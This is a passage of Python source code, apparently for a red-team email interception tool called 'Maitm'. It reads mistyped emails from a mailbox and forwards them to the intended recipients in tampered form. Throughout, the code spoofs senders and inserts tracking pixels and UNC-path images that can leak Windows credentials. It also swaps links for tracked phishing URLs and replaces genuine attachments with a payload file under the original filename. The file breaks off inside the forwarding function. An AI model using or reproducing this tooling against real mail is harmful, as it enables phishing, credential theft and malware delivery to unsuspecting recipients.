from .Bells import TeamsBell,DiscordBell
import logging.config
from yaml import load,CLoader
import yaml
from imap_tools import MailBox, AND
# from imap_tools.message import MailMessage
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os, sys, time, re
from datetime import datetime, timedelta
from smtplib import SMTP
# from email.message import EmailMessage
from email.message import EmailMessage as PythonEmailMessage
import mimetypes
from bs4 import BeautifulSoup as bs
import random, string
from base64 import b64decode, b64encode
from urllib.parse import urlparse
from requests.models import PreparedRequest
from .MailManager import MailManager
import re
from email.utils import parseaddr, getaddresses
import quopri
import copy

class Maitm():
    def __init__(self,config_file=None,only_new=True,forward_emails=False,logfile="logs/maitm.log",level=logging.INFO) -> None:
        self.config = {}
        self.bells = []
        self.typos = {}
        self.smtp_connection = None
        self.only_new = only_new
        self.forward_emails = forward_emails
        self.logfile=logfile

        # Initialization
        if (os.path.exists(config_file)):
            self.read_config(config_file=config_file)

        self.mailmanager=MailManager(auth_config=self.config['auth'],logfile=datetime.now().strftime("logs/%Y%m%d_%H%M%S_mailmanager.log"))
        # set the date limit to search emails 
        self.date_limit = self.config["filter"]["date_limit"] if "date_limit" in self.config["filter"].keys() else None
        # Set the ignore_seen flag to ignore emails that have been already read by this script
        self.ignore_seen = self.config["filter"]["ignore"]["ignore_seen"] if "ignore_seen" in self.config["filter"]["ignore"].keys() else False
        self.spoof_sender=self.config["misc"]["sender"]["spoof"] if "spoof" in self.config["misc"]["sender"].keys() else False
        self.fixed_sender=self.config["misc"]["sender"]["fixed"] if "fixed" in self.config["misc"]["sender"].keys() else None
        self.poll_interval = self.config["misc"]["poll_interval"] if "poll_interval" in self.config["misc"].keys() else 60
        self.tracking_url = self.config["injections"]["tracking_url"] if "tracking_url" in self.config["injections"].keys() else None
        self.unc_path = self.config["injections"]["unc_path"] if "unc_path" in self.config["injections"].keys() else None
        self.links =  self.config["injections"]["links"] if "links" in self.config["injections"].keys() else None
        self.attachment =  self.config["injections"]["attachments"]["path"] if "attachments" in self.config["injections"].keys() and "path" in self.config["injections"]["attachments"].keys() else None
        self.attachment_message =  self.config["injections"]["attachments"]["attachment_message"] if "attachments" in self.config["injections"].keys() and "attachment_message" in self.config["injections"]["attachments"].keys() else None
        self.tracking_param = self.config["misc"]["tracking_param"] if "tracking_param" in self.config["misc"] else "customerid"
        if "smtp" in self.config["auth"]["send"]:
            self.authenticated_username = self.config["auth"]["send"]["smtp"]["username"]
        elif "oauth2legacy" in self.config["auth"]["send"]:
            self.authenticated_username = self.config["auth"]["send"]["oauth2legacy"]["email"]
        else:
            self.authenticated_username = None

        # Populate the bells
        self.build_bells()
        self.init_logging(log_filename=logfile)

    ##########
    # Config #
    ##########
    
    def read_config(self,config_file):
        path,filename = os.path.split(config_file)
        config = load(open(config_file,"r").read(),Loader=CLoader)
        # Read each file and build the config object from merging all the options
        for part in config.keys():
            part_config = load(open("{}/{}".format(path,config[part]),"r").read(),Loader=CLoader)
            self.config[part]=part_config

    def init_logging(self,log_filename):
        # Ensure the 'logs' directory exists
        os.makedirs(os.path.dirname(log_filename), exist_ok=True)

        # Load the logging configuration from a YAML file
        with open('config/logging.yml', 'r') as f:
            config = yaml.safe_load(f.read())
            # Update the filename in the configuration
            config['handlers']['file_handler']['filename'] = log_filename
            logging.config.dictConfig(config)

        # Example usage
        self.logger = logging.getLogger()

    ##############
    # Mail Login #
    ##############
    def smtp_login(self):
        sc = self.config["auth"]["smtp"]
        smtp = SMTP(sc["server"], sc["port"])
        smtp.ehlo()
        if (sc["tls"]):
            smtp.starttls()
        # Login only if we have specified user credentials
        if (sc["username"] is not None):
            smtp.login(sc["username"],sc["password"])
        
        self.smtp_connection = smtp

    def imap_login(self):
        ic = self.config["auth"]["imap"]
        self.imap_mailbox = MailBox(ic["server"],ic["port"]).login(ic["username"],ic["password"])

    #################
    # Notifications #
    #################
            
    def build_bells(self):
        # For each bell defined in the configuration
        for webhook_name in self.config['notifications'].keys():
            if webhook_name == "teams":
                self.bells.append(TeamsBell(webhook_url=self.config['notifications'][webhook_name]))
            elif webhook_name == "discord":
                self.bells.append(DiscordBell(webhook_url=self.config['notifications'][webhook_name]))
            else:
                self.logger.debug("Webhook key '{}' not identified. Skipping.".format(webhook_name))
 
    """
    Send a message containing details of the forwarded message to Teams and Discord bells
    """
    def notify_master(self,msg: PythonEmailMessage, action: str,reason: str):
        # For each bell, ring it
        for bell in self.bells:
            bell.ring(msg,action,reason)

    """
    Send a heartbeat to Teams and Discord bells
    """
    def heartbeat(self):
        # For each bell, ring it
        for bell in self.bells:
            bell.heartbeat()
    
    #########
    # Utils #
    #########
    def countdown(self,seconds):
        for remaining in range(seconds, 0, -1):
            sys.stdout.write("\r")
            sys.stdout.write("{:2d}s".format(remaining)) 
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\n")

    """
    If the UID of this email has not been previously forwarded, it is consired new email
    """
    def is_new_email(self,msg_uid: str):
        uids=[uid.strip() for uid in open("forwardedemails.txt","r").readlines()]
        return msg_uid not in uids
    """
    Save this UID as observed and forwarded
    """
    def flag_observed(self,msg_uid: str):
        with open("forwardedemails.txt","a") as fe:
            fe.write(msg_uid+"\n")
    
    """
    Check the date of this message is more recent than the limit we have set in the configuration file
    """
    def is_recent(self,msg: PythonEmailMessage):
        date_format = '%a, %d %b %Y %H:%M:%S %z'
        if (self.date_limit is not None):
            return datetime.strptime(msg["date"], date_format) > self.date_limit
        return self.date_limit is None
    
    """
    Check if the message is coming from an ignored domain
    """
    def ignored_domains(self,msg: PythonEmailMessage):
        # Regular expression pattern to extract the domain name
        email_pattern = r'<?([\w\.-]+)@([\w\.-]+)>?'
        # Get the domain of the users this emails is being sent to
        # Return true if any of the destination users is in the deny list of domains
        domain_hit=False
        # Check the domain of the recipient(s)
        ign_to_domains=self.config["filter"]["ignore"]["to_domains"] if "to_domains" in self.config["filter"]["ignore"].keys() else []
        if (ign_to_domains is not None and len(ign_to_domains)>0):
            if isinstance(msg["to"], list):
                rcpt_list = msg["to"]
            else:
                rcpt_list = [a.strip() for a in msg["to"].split(",")]

            # Iterate over the recipients
            for rcpt in rcpt_list:
                match = re.search(email_pattern, rcpt)
                if match:
                    domain = match.group(2)
                    if domain in ign_to_domains:
                        domain_hit = True
                        break

        # Check the domain of the sender(s)
        ign_from_domains=self.config["filter"]["ignore"]["from_domains"] if "from_domains" in self.config["filter"]["ignore"].keys() else []
        if (ign_from_domains is not None and len(ign_from_domains)>0):
            if isinstance(msg["from"], list):
                from_list = msg["from"]
            else:
                from_list = [a.strip() for a in msg["from"].split(",")]

            # Iterate over the from addresses
            for from_ in from_list:
                match = re.search(email_pattern, from_)
                if match:
                    domain = match.group(2)
                    if domain in ign_from_domains:
                        domain_hit = True
                        break
        
        return domain_hit
    
    """
    Check if the message has an ignored subject
    """
    def ignored_subject(self,msg: PythonEmailMessage):
        if ("subjects" in self.config["filter"]["ignore"].keys() and len(self.config["filter"]["ignore"]["subjects"])>0):
            for ignored_subject in self.config["filter"]["ignore"]["subjects"]:
                if (msg["subject"] is not None):
                    pattern = re.compile(ignored_subject, re.IGNORECASE)
                    if len(re.findall(pattern,msg["subject"]))>0:
                        return True
        return False
    
    """
    Check if this email should be ignored based on the domain of the sender or the recipient or the subject
    """
    def ignore_mail(self, msg: PythonEmailMessage):
        return self.ignored_domains(msg) or self.ignored_subject(msg)
    
    """
    Log details of the MailMessage object
    TODO: Override the __str__ method of MailMessage
    """
    def log_msg_details(self,msg: PythonEmailMessage):
        payload_len = 0
        # Get the first part size
        if msg.get_content_type() == 'multipart/alternative':
            payload_len = len(msg.get_payload()[0])
        else:
            payload_len = len(msg.get_payload())

        self.logger.info("========[%s]========\nEmail UID: %s\nFROM: %s\nTO: %s\nSubject: %s\nSize: %s" 
                         % (msg["date"], msg["uid"], msg["from"], msg["to"],msg["subject"], payload_len))
    
    """
    Fix the typos defined in the file typos.yml
    """
    def fix_addresses_typos(self,to_addresses):
        fixed_addresses = []

        # Convert the string to a list of addresses
        if (isinstance(to_addresses,str)):
            self.logger.debug("to_addresses is a string. Parsing it to a list of tuples")
            addresses = getaddresses([to_addresses])
        else:
            self.logger.debug("to_addresses is not a string. It is a %s" % type(to_addresses))

        # Iterate over the addresses
        for to_address in [a[1] for a in addresses]:
            # Search and forward only to the addresses that have typos. 
            # Ignore the rest of the emails, as they received their copy
            name,email = parseaddr(to_address)
            if (email is not None and len(email)>0):
                user,domain = email.split("@")
            else:
                user = domain = None

            fixed_address=to_address
            # TODO: Make this case insensitive 
            if domain in self.config["typos"]["domain"].keys():
                # Search the domain replacement rules
                fixed_address=user+"@"+self.config["typos"]["domain"][domain]
                fixed_addresses.append(fixed_address)
                self.logger.debug("Typo fix found: %s --> %s" % (to_address,fixed_address))
            # Search in hardcoded addresses
            elif to_address in self.config["typos"]["address"].keys():
                fixed_address=self.config["typos"]["address"][to_address]
                fixed_addresses.append(fixed_address)
                self.logger.debug("Typo fix found: %s --> %s" % (to_address,fixed_address))
            else:
                self.logger.debug("No typo fix found for %s" % to_address)

        return fixed_addresses


    ##############
    # Injections #
    ##############
    """
    Insert the tracking pixel in the email
    """
    def insert_tracking_pixel_html(self,id,html: bytes,charset=None):
        # parse the html and add the image to the end of the body

        # If the html content of the email is empty
        if (html is None or len(html)==0):
            html="<html><body></body></html>"

        # If the encoding is not specified, we will try to guess it
        if (charset is None):
            charset=self.infer_content_charset(html)

        soup=bs(html,"html.parser", from_encoding=charset)
        tracking_pixel=bs('<img src="{}" style="height:1px !important; width:1px !important; border: 0 !important; margin: 0 !important; padding: 0 !important" width="1" height="1" border="0">'.format(self.get_replacement_url(self.tracking_url,id)),"html.parser")
        show_images_message=bs("<h3>Allow images in this email for additional details</h3>","html.parser")
        soup_body=soup.find("body")
        if (soup_body is  None):
            soup_body=soup.find()
        
        soup_body.insert(0,show_images_message)
        soup_body.insert(0,tracking_pixel)

        return soup.encode(charset)

    """
    Insert the tracking UNC link in the email
    """
    def insert_unc_path_html(self,id,html: bytes,charset=None):
        # parse the html and add the UNC to the end of the body
        
        # If the html content of the email is empty
        if (html is None or len(html)==0):
            html="<html><body></body></html>"

        # If the encoding is not specified, we will try to guess it
        if (charset is None):
            charset=self.infer_content_charset(str(html))

        soup=bs(html,"html.parser", from_encoding=charset)
        unc_element=bs('<img src="{}" style="height:1px !important; width:1px !important; border: 0 !important; margin: 0 !important; padding: 0 !important" width="1" height="1" border="0">'.format(self.config["injections"]["unc_path"]),"html.parser")
        sb=soup.find("body")
        if (sb is  None):
            sb=soup.find()
        
        sb.insert(0,unc_element)

        return soup.encode(charset)

    """
    Inject attachment message on plaintext content
    """
    def inject_attachment_message_plain(self,content: str,charset=None):
        if (self.attachment is not None and self.attachment_message is not None):
            content=self.config["injections"]["attachments"]["attachment_message"]+"\n\n"+content
        else:
            self.logger.debug("No attachment message to inject in the email.")

        return content
            
    
    """
    Inject attachment message on HTML content
    """
    def inject_attachment_message_html(self,content: bytes,charset=None):
        # If the encoding is not specified, we will try to guess it
        if (charset is None):
            charset=self.infer_content_charset(content)
        soup=bs(content,"html.parser", from_encoding=charset)
        sb=soup.find("body")
        if (sb is  None):
            sb=soup.find()

        # Modify the soup if the attachment message is defined
        if ("attachments" in self.config["injections"].keys() and "attachment_message" in self.config["injections"]["attachments"].keys()):
            sb.insert(0,bs(self.config["injections"]["attachments"]["attachment_message"],features="html.parser"))
        else:
            self.logger.debug("No attachment message to inject in the email.")

        return soup.encode(charset)
            
    """
    Count the number of attachments in the PythonMailMessage object
    """
    def _count_attachments(self,email_msg: PythonEmailMessage):
        return len(list(email_msg.iter_attachments()))

    """
    Remove all attachments from the email message
    """
    def _remove_attachments(self, email_message: PythonEmailMessage):
        for att in email_message.iter_attachments():
            email_message.get_payload().remove(att)

    """
    Retrieve the headers of a specific attachment
    """
    def _get_attachments_headers(self, email_message: PythonEmailMessage, attachment_number=0):
        headers = {}
        for k, v in list(email_message.iter_attachments())[attachment_number].items():
            if (k not in headers.keys()):
                headers[k] = v
            else:
                # Prevent duplicate headers
                if (headers[k] != v):
                    headers[k] = headers
        return headers

    """
    Inject or replace the mail attachement
    """
    def inject_attachment(self,original_msg: PythonEmailMessage, fake_msg: PythonEmailMessage):
        # Inline function to inject the attachment to a message
        def inject(msg, filename, headers=None):
            path = self.config["injections"]["attachments"]["path"]
            _f = open(path, 'rb')
            mimetype, _ = mimetypes.guess_type(path)
            att = MIMEApplication(_f.read(), _subtype=mimetype.split('/')[1] if mimetype else 'octet-stream')
            _f.close()
            att.add_header('Content-Disposition', 'attachment', filename=filename)
            try:
                msg.attach(att)
            except Exception as e:
                self.logger.error("Error injecting attachment: %s" % e)

            return msg
        
        # Check if the rules for attachments are defined
        if ("attachments" in self.config["injections"].keys()):
            injected_filename = os.path.basename(self.config["injections"]["attachments"]["path"])
            inject_ext = os.path.splitext(injected_filename)[-1]

            # TODO: msg.attach can only be used if the message is multipart, if not, we have to modify the original email to be multipart
            # TODO: Fix that by modifying the type of the email to be multipart and add the attachment
            # if not fake_msg.is_multipart():
            #     # fake_msg._make_multipart()
            #     fake_msg = self.convert_to_multipart(fake_msg)

            # If the original message has attachments
            if (self._count_attachments(original_msg) > 0):
                self.logger.debug("Replacing the original attachments of the email")
                # Get the headers of the original attachment to copy them to the new one
                original_attachment_headers=self._get_attachments_headers(original_msg, attachment_number=0)
                
                # Get the original attachment file name (first hit) to name our payload the same
                original_filename = list(original_msg.iter_attachments())[0].get_filename()
                orig_ext = None
                if (original_filename is not None):
                    orig_ext = os.path.splitext(original_filename)[-1]

                # Remove all the attachments from the email
                self._remove_attachments(fake_msg)
                
                new_filename = original_filename
                if (orig_ext and inject_ext and orig_ext != inject_ext):
                    new_filename = original_filename + inject_ext
                fake_msg = inject(fake_msg, new_filename, headers=original_attachment_headers)

            else:
                self.logger.debug("Injecting a new attachment")
                fake_msg = inject(fake_msg, injected_filename)

        else:
            self.logger.debug("No attachments section found. Not injecting any attachment.")

        return fake_msg
    
    """
    Inject headers in the message headers
    """
    def inject_headers(self, fake_msg: PythonEmailMessage):
        if ("headers" in self.config["injections"].keys()):
            # Inject headers
            for hname,hvalue in self.config["injections"]["headers"].items():
                fake_msg.add_header(hname,hvalue)
        else:
            self.logger.debug("No headers to inject")
        
        return fake_msg


    #################
    # Replace links #
    #################

    """
    Replace links to a specific domain of the email with the ones desired by us. 
    """
    def replace_links_to_domain_plain(self,replacement,domain,content: str,charset=None):
        # Transform bytes to string
        tampered_content = content
        pattern = r"(https?://{}[^ ]+)".format(domain)
        match = re.search(pattern, content)
        if match:
            tampered_content = re.sub(pattern, replacement, content)
        else:
            tampered_content = "Navigate to the following link to obtain further details: " + replacement + "\n" + content
        return tampered_content
        
    """
    Replace links to a specific domain of the email with the ones desired by us. 
    """
    def replace_links_to_domain_html(self,replacement,domain,content: bytes,charset=None): 
        # If the encoding is not specified, we will try to guess it
        if (charset is None):
            charset=self.infer_content_charset(content)
        soup=bs(content,"html.parser", from_encoding=charset)
        links = soup.find_all("a")
        for link in links:
            href=link.get("href")
            text=link.string
            if (domain in urlparse(href).netloc):
                link["href"]=replacement
                self.logger.debug("Tamper Domain Links - Changing link in the email from '%s (%s)' to '%s'" % (text,href,replacement))
        return soup.encode(charset)

    """
    Replace all links of the email with the ones desired by us. 
    """
    def replace_all_links_plain(self,replacement,content: str,charset=None):
        # Transform bytes to string
        tampered_content = content
        # TODO: Check there is at least one link in the text content. If not, add one manually
        url_pattern = re.compile(
            r'(?:(?:https?|ftp)://)'  # Scheme (http, https, ftp)
            r'(?:\S+(?::\S*)?@)?'  # Optional user:password authentication
            r'(?:'  # Host
            r'(?P<ip>\d{1,3}(?:\.\d{1,3}){3})|'  # IPv4
            r'(?P<domain>'  # Domain name
            r'(?:(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})'  # Domain with TLD
            r'|localhost'  # localhost
            r'|\[(?P<ipv6>[a-fA-F0-9:]+)\]'  # IPv6
            r')'
            r')'  # End host
            r'(?::\d{2,5})?'  # Optional port
            r'(?:/[^\s)]+)?',  # Path and query string or a closing parenthesis
            re.IGNORECASE
        )
        match = re.search(url_pattern, content)
        if match:
            tampered_content = re.sub(url_pattern, replacement, content)
        else:
            tampered_content = "Navigate to the following link to obtain further details: " + replacement + "\n\n" + content
        return tampered_content
    
    # """
    # Replace links in a substring of the email body
    # This function is needed because BeautifuSoup ignores (?) the content within the <!--if[mso]> sections
    # """
    # def replace_links_in_mso_section(self, content, replacement):
    #     mso_soup = bs(content, "html.parser")
    #     link_tags = mso_soup.find_all(re.compile(r'^a(?::[\w-]+)?$'))
        
    #     for link in link_tags:
    #         href = link.get("href")
    #         if href and not re.match("^mailto:", href):
    #             link["href"] = replacement
    #             self.logger.debug("Tamper MSO Links - Changing link in the email from '%s' to '%s'" % (href, replacement))
        
    #     return str(mso_soup)

    """
    Replace all links of the email with the ones desired by us. 
    """
    def replace_all_links_html(self,replacement,content: bytes,charset=None):
        # If the encoding is not specified, we will try to guess it
        if (charset is None):
            charset=self.infer_content_charset(content)
        target_soup=bs(content,"html.parser", from_encoding=charset)
        # Regular expression to match <a> tags and any <a:*> tags
        link_tags = target_soup.find_all(re.compile(r'^a(?::[\w-]+)?$'))
        if link_tags:
            for link in link_tags:
                href=link.get("href")
                if (not re.match("^mailto:",href)):
                    text=link.string
                    link["href"]=replacement
                    self.logger.debug("Tamper All Links - Changing link in the email from '%s (%s)' to '%s'" % (text,href,replacement))
                else:
                    self.logger.debug("Link was a mail link. Not replacing it")
        else:
            # Inject a new link, as there are none in the original email
            self.logger.debug("No links detected in this email, injecting a new one.")
            new_link=bs('<h1>Click <a href="{}">here</a> to see the attachment.</h1><br/>'.format(replacement),"html.parser",from_encoding=charset)
            sb=target_soup.find("body")
            if (sb is  None):
                sb=target_soup.find()
            
            sb.insert(0,new_link)

        # TODO: De-duplicate the code. This part is annoying.
        # Manually iterating through the sections within the <!--if[mso]> sections
        # as BeautifulSoup ignores them (?) and we need to replace the links in there as well
        # content_str = str(target_soup)
        # content_str = re.sub(
        #     r'<!--\[if mso\]>(.*?)<!\[endif\]-->',
        #     lambda match: self.replace_links_in_mso_section(match.group(1), replacement),
        #     content_str,
        #     flags=re.DOTALL
        # )

        return target_soup.encode(charset)

    """
    Replace all links of the email with the ones desired by us. 
    It accepts a content_type parameter to decide how to handle the content
    Parameters:
    * id: str - The tracking ID to be injected in the URL
    * content: str - The content of the email. It has t be already a "clean" 'utf-8' string. No need to deal with encodings and replacing weird characters here
    """
    def replace_links_html(self,id,content: bytes,charset=None):
        # Inline function to prepare the replacement URL
        def get_replacement_url(pl,id):
            params = {self.tracking_param:id}
            prepared_url = PreparedRequest()
            prepared_url.prepare_url(pl, params)
            return prepared_url.url
        
        tampered_content = content
        if ("links" in self.config["injections"].keys()):
            # If we have a global rule for all links
            if ("all" in self.config["injections"]["links"]):
                phishing_link=self.config["injections"]["links"]["all"]
                tampered_content=self.replace_all_links_html(get_replacement_url(phishing_link,id),content,charset=charset)
            # If we have a rule for specific domains to replace
            else:
                for domain in self.config["injections"]["links"].keys():
                    phishing_link=self.config["injections"]["links"][domain]
                    tampered_content=self.replace_links_to_domain_html(get_replacement_url(phishing_link,id),domain,content, charset=charset)
                    content=tampered_content
                    
        return tampered_content

    # Inline function to prepare the replacement URL
    def get_replacement_url(self,url,id):
        params = {self.tracking_param:id}
        prepared_url = PreparedRequest()
        prepared_url.prepare_url(url, params)
        return prepared_url.url

    """
    Replace all links of the email with the ones desired by us. 
    It accepts a content_type parameter to decide how to handle the content
    Parameters:
    * id: str - The tracking ID to be injected in the URL
    * content: str - The content of the email. It has t be already a "clean" 'utf-8' string. No need to deal with encodings and replacing weird characters here
    """
    def replace_links_html(self,id,content: bytes, charset=None):        
        tampered_content = content
        if ("links" in self.config["injections"].keys()):
            # If we have a global rule for all links
            if ("all" in self.config["injections"]["links"]):
                phishing_link=self.config["injections"]["links"]["all"]
                tampered_content=self.replace_all_links_html(self.get_replacement_url(phishing_link,id),content,charset=charset)
            # If we have a rule for specific domains to replace
            else:
                for domain in self.config["injections"]["links"].keys():
                    phishing_link=self.config["injections"]["links"][domain]
                    tampered_content=self.replace_links_to_domain_html(self.get_replacement_url(phishing_link,id),domain,content, charset=charset)
                    content=tampered_content
                    
        return tampered_content
    
    """
    Replace all links of the email with the ones desired by us. 
    It accepts a content_type parameter to decide how to handle the content
    Parameters:
    * id: str - The tracking ID to be injected in the URL
    * content: str - The content of the email. It has t be already a "clean" 'utf-8' string. No need to deal with encodings and replacing weird characters here
    """
    def replace_links_plain(self,id,content: str, charset=None):        
        tampered_content = content
        if ("links" in self.config["injections"].keys()):
            # If we have a global rule for all links
            if ("all" in self.config["injections"]["links"]):
                phishing_link=self.config["injections"]["links"]["all"]
                tampered_content=self.replace_all_links_plain(self.get_replacement_url(phishing_link,id),content,charset=charset)
            # If we have a rule for specific domains to replace
            else:
                for domain in self.config["injections"]["links"].keys():
                    phishing_link=self.config["injections"]["links"][domain]
                    tampered_content=self.replace_links_to_domain_plain(self.get_replacement_url(phishing_link,id),domain,content, charset=charset)
                    content=tampered_content
                    
        return str(tampered_content)


    # Function to get the content encoding of a string representing an HTML document
    def infer_content_charset(self, html: str):
        soup = bs(html, 'html.parser')
        # Look for <meta charset="...">
        meta_charset = soup.find('meta', charset=True)
        if meta_charset:
            return meta_charset['charset']
        
        # Look for <meta http-equiv="Content-Type" content="text/html; charset=...">
        meta_content_type = soup.find('meta', attrs={'http-equiv': 'Content-Type'})
        if meta_content_type:
            content = meta_content_type.get('content', '')
            if 'charset=' in content:
                return content.split('charset=')[-1]
        
        return None

    """
    This function encodes the body of the payload to support unicode characters and safely send the email using smtplib or exchangelib
    Else, we will get errors complaining of unicode characters not being correctly encoded by the library to ascii
    """
    def prepare_payload_for_email(self, content: bytes, content_type: str, charset='utf-8'):
        def quopri_encode(text: bytes, charset):
            return quopri.encodestring(text).decode('ascii')

        def base64_encode(text: bytes, charset):
            return b64encode(text).decode('ascii')

        # The email can contain unicode characters, so we need to convert them to an adequate ascii encoding supported by smtplib and exchangelib
        # They will send weird characters if we don't do this
        encoding = 'quoted-printable' if content_type == 'text/html' else 'base64'
        # Use quopri to encode the payload
        if encoding == 'quoted-printable':
            encoded_payload = quopri_encode(content, charset=charset)
        else:
            encoded_payload = base64_encode(content, charset=charset)
        
        return encoded_payload, encoding


    ####################
    # Forwarding logic #
    ####################

    def decode_part_payload(self, part: PythonEmailMessage):
        charset = part.get_content_charset() if part.get_content_charset() is not None else 'utf-8'
        # Check this is not a multipart part and it's a 'text/plain' or 'text/html' part
        if (part.is_multipart() or part.get_content_type() not in ['text/plain', 'text/html']):
            return None
        else:
            # Get the payload and content-transfer-encoding
            payload = part.get_payload()
            cte = part.get('Content-Transfer-Encoding', '7bit').lower()
            
            # Decode according to the content-transfer-encoding
            if cte == 'base64':
                decoded_content = b64decode(payload).decode(part.get_content_charset(charset))
            elif cte == 'quoted-printable':
                decoded_content = quopri.decodestring(payload).decode(part.get_content_charset(charset))
            elif cte in ('7bit', '8bit', 'binary'):
                decoded_content = payload # payload.decode(part.get_content_charset())
            else:
                raise ValueError(f"Unknown Content-Transfer-Encoding: {cte}")
            
            return decoded_content

    """
    Taint the HTML part of the email
    """
    def taint_html_part(self, part, id):
        charset = part.get_content_charset() if part.get_content_charset() is not None else 'utf-8'
        content_type = part.get_content_type()
        target_html_bytes = part.get_payload(decode=True)
        target_html = self.decode_part_payload(part)
        
        # This is fucking with my mind: https://github.com/westwater/mtd-whitelisting/issues/2
        # I get \xa0 characters when using beautiful soup and there are &nbsp; characters in the original html so we need to fix that thing manually :-(
        # Due to this annoying behaviour, I need to manually replace all &nbsp; html entities from the original HTML.
        # What annoys me most is that this is not happening with other HTML entities, such as &lt; or &gt;
        target_html=target_html.replace('&nbsp;',' ')
        target_html=target_html.replace('\xa0',' ')

        # Insert the tracking pixel
        tainted_html_bytes = target_html_bytes
        if (self.tracking_url is not None):
            tainted_html_bytes=self.insert_tracking_pixel_html(id,target_html_bytes,charset=charset)
        # Insert the UNC path
        if (self.unc_path is not None):
            tainted_html_bytes=self.insert_unc_path_html(id,tainted_html_bytes,charset=charset)
        # Modify the links
        if (self.links is not None):
            tainted_html_bytes=self.replace_links_html(id,tainted_html_bytes, charset=charset)
        # Inject the attachment message if defined
        # We do this before the file attachement itself because I don't like to manage the content of the object EmailMessage
        if (self.attachment_message):
            tainted_html_bytes=self.inject_attachment_message_html(tainted_html_bytes,charset=charset)
        
        # Setting the new HTML payload with the tainted content 
        # The email can contain unicode characters, so we need to convert them to an adequate ascii encoding supported by smtplib and exchangelib
        # They will send weird characters if we don't do this
        encoded_payload,transfer_encoding = self.prepare_payload_for_email(tainted_html_bytes, content_type=content_type, charset=charset)
        self.logger.debug("Charset before setting payload: %s" % charset)
        self.logger.debug("Encoding before setting payload: %s" % part.get('Content-Transfer-Encoding'))
        # Change the payload encoding header to match the variable 'encoding'
        if (part.get('Content-Transfer-Encoding') is not None):
            part.replace_header('Content-Transfer-Encoding', transfer_encoding)
        else:
            part.add_header('Content-Transfer-Encoding', transfer_encoding)
        part.set_payload(encoded_payload)
        self.logger.debug("Charset after setting payload: %s" % part.get_content_charset())
        self.logger.debug("Encoding after setting payload: %s" %  part.get('Content-Transfer-Encoding'))

    """
    Taint the plain text part of the email
    """
    def taint_plain_part(self, part, id):
        charset = part.get_content_charset() if part.get_content_charset() is not None else 'utf-8'
        content_type = part.get_content_type()
        target_text = self.decode_part_payload(part)

        # Insert the tracking pixel or UNC path do not apply here. Skipping
        # Modify the links
        tainted_text=self.replace_links_plain(id,target_text,charset=charset)
        # Inject the attachment message if defined
        # We do this before the file attachement itself because I don't like to manage the content of the object EmailMessage
        tainted_text=self.inject_attachment_message_plain(tainted_text,charset=charset)

        # The email can contain unicode characters, so we need to convert them to an adequate ascii encoding supported by smtplib and exchangelib
        # They will send weird characters if we don't do this
        encoded_payload,transfer_encoding = self.prepare_payload_for_email(tainted_text.encode(charset), content_type=content_type, charset=charset)
        self.logger.debug("Charset before setting payload: %s" % charset)
        self.logger.debug("Encoding before setting payload: %s" % part.get('Content-Transfer-Encoding'))        
        # Change the payload encoding header to match the variable 'encoding'
        if (part.get('Content-Transfer-Encoding') is not None):
            part.replace_header('Content-Transfer-Encoding', transfer_encoding)
        else:
            part.add_header('Content-Transfer-Encoding', transfer_encoding)
        part.set_payload(encoded_payload)
        self.logger.debug("Charset after setting payload: %s" % part.get_content_charset())
        self.logger.debug("Encoding after setting payload: %s" %  part.get('Content-Transfer-Encoding'))



    """
    Recursively explore the multipart/alternate and multipart/mixed messages
    Just for the records, this is the function that took me longer to write. I hate recursion.
    """
    def taint_email_parts(self, msg: PythonEmailMessage, id, level=0):
        tainted_msg = msg
        ct = msg.get_content_type()
        
        if (not msg.is_multipart() and ct != 'text/html' and ct != 'text/plain'):
            self.logger.debug((' '*level*2)+"|_[L%s] [%s] Not a message or part to be tainted. Skipping." % (level,id))
            return tainted_msg
        else:
            if msg.get_payload() is not None:
                # Iterate over the parts of the mixed content and taint the HTML and plain text parts
                self.logger.debug((' '*level*2)+"|_[L%s] [%s] Tainting a '%s' with payload length of %s" % (level,id, msg.get_content_type(),len(msg.get_payload()) if msg.get_payload() is not None else 0))
                # If the message is multipart, recursively taint the payloads of this multipart message
                if msg.is_multipart():
                    tainted_payloads = []
                    part_number = 0
                    for payload in msg.get_payload():
                        part_number += 1
                        if (type(payload) is PythonEmailMessage):
                            self.logger.debug((' '*level*2)+"|_[L%s] Tainting part %s: '%s'" % (level, part_number, payload.get_content_type()))
                            tainted_part = self.taint_email_parts(payload, id, level+1)
                            tainted_payloads.append(tainted_part)
                        else:
                            self.logger.debug((' '*level*2)+"|_[L%s] Part %s is not a PythonEmailMessage. Adding it as is (not tainting)." % (level, part_number))
                            tainted_payloads.append(payload)
                    # Set the payload of the multipart message with the tainted parts
                    # TODO?: Build an EmailMessage object with the tainted parts
                    tainted_msg.set_payload(tainted_payloads)
                # If the message is not multipart, it is a single part message and we can taing html and text parts
                else:
                    # If the message is not multipart, it is a single part message
                    if ct == 'text/html':
                        self.logger.debug((' '*level*2)+"|_[L%s] Tainting HTML part: %s" % (level, ct))
                        self.taint_html_part(tainted_msg, id)
                    if ct == 'text/plain':
                        self.logger.debug((' '*level*2)+"|_[L%s] Tainting plain text part: %s" % (level, ct))
                        self.taint_plain_part(tainted_msg, id)
            else:
                self.logger.debug((' '*level*2)+"|_[L%s] [%s] Payload is empty. Skipping." % (level,id))
                
        return tainted_msg

    """
    Forward the message to the legitimate recipient
    """ 
    def forward_message(self,msg: PythonEmailMessage):
        # Pick the uid and with SMTP forward it
        forwarded=False
        reason="Unknown"
        # Copying the source message object to a modified version of it object
        fake_msg = copy.deepcopy(msg) # PythonEmailMessage()

        try:
            # fake_msg.replace_header("Subject",msg["subject"].replace("\n","").replace("\r",""))
            # Decide what sender we are going to be
            if (self.spoof_sender):
                fake_msg.replace_header("From",msg["from"]) # .name+" <"+msg.from_values.email+">"
            elif(self.fixed_sender is not None):
                fake_msg.replace_header("From",self.fixed_sender)
            elif(self.authenticated_username is not None):
                fake_msg.replace_header("From",self.authenticated_username) 
            else:
                fake_msg.replace_header("From","Max Headroom <max@headroom.com>")
            
            # Generate an Id for this email
            id=''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
            id+="."+b64encode((fake_msg["To"].split("@")[0]).encode("utf-8")).decode("utf-8")

            # Get the HTML content to alter
            fake_msg = self.taint_email_parts(fake_msg, id)

            # Attach files
            fake_msg=self.inject_attachment(msg,fake_msg)
            
            # Inject headers
            fake_msg=self.inject_headers(fake_msg)
            
